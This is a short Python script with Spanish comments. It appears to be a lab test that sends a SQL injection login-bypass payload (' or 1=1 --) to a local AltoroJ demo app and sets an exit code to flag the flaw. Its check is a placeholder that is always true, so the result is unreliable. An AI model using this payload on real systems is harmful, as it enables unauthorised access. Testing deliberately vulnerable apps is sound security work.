import requests

# Define la URL de AltoroJ
url = "http://localhost:8130/altoroj/algoMas"

# Payload para Inyeccion SQL
payload = "' or 1=1 --"

#Solicitud POST
data = {"username": payload, "password": "any_password"}
response = requests.post(url, data=data)

#Para saber que contiene y que poner en el if
print(response.text)

#Respuesta POST
if "" in response.text:
    #Vulnerabilidad presente
    exitCode = 1  
else:
    exitCode = 0

exit(exitCode)
